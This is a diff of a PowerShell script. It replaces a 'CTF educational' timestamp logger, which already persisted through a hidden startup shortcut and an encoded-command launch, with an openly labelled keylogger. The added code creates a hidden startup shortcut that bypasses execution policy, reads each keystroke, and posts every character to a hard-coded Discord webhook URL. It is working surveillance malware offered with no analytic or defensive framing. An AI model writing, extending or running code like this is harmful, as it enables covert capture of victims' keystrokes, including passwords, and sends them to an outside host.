@@ -1,38 +1,38 @@
-# === [CONFIG] ===
-$scriptName = "ctf_script.ps1"
-$scriptPath = "$env:APPDATA\$scriptName"
-$logFile = "$env:APPDATA\ctf_log.txt"
-$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ctf_startup.lnk"
+# --- Configuration ---
+$webhookUrl = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
+$scriptPath = $MyInvocation.MyCommand.Definition
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupFolder "k.lnk"
 
-# === [STEP 1] - Generate the background script ===
-$scriptContent = @'
-# CTF Educational Script - Logging timestamps every 10 seconds
-"CTF script started at $(Get-Date)" | Out-File "$env:APPDATA\ctf_log.txt" -Append
-while ($true) {
-    Start-Sleep -Seconds 10
-    "Running at $(Get-Date)" | Out-File "$env:APPDATA\ctf_log.txt" -Append
+# --- Function to create shortcut in Startup folder ---
+function Create-StartupShortcut {
+    if (-not (Test-Path $shortcutPath)) {
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutPath)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $shortcut.WorkingDirectory = Split-Path $scriptPath
+        $shortcut.Save()
+    }
 }
-'@
 
-# Create the script file
-$scriptContent | Out-File $scriptPath -Encoding UTF8 -Force
-Write-Host "✅ Script written to $scriptPath"
+# --- Create startup shortcut if not exists ---
+Create-StartupShortcut
 
-# === [STEP 2] - Create shortcut in Startup folder ===
-$WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut($startupShortcut)
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-$shortcut.WorkingDirectory = $env:APPDATA
-$shortcut.WindowStyle = 7  # Minimized
-$shortcut.Save()
+# --- Keylogger loop ---
+Write-Host "Keylogger started. Press ESC to stop."
 
-Write-Host "✅ Startup shortcut created at $startupShortcut"
-Write-Host "🧪 This will run at next login and log to $logFile"
+while ($true) {
+    $key = [console]::ReadKey($true)  # true = do not display key
+    if ($key.Key -eq 'Escape') { break }
 
-# === [STEP 3] - Run script now (without UAC prompt) ===
-$bytes = [System.Text.Encoding]::Unicode.GetBytes('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $scriptPath + '"')
-$encodedCommand = [Convert]::ToBase64String($bytes)
-Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommand" -WindowStyle Hidden
-
-Write-Host "✅ Script also started in background for current session"
+    $char = $key.KeyChar
+    if ($char -ne '') {
+        $payload = @{ content = $char } | ConvertTo-Json
+        try {
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+        } catch {
+            # Ignore errors
+        }
+    }
+}
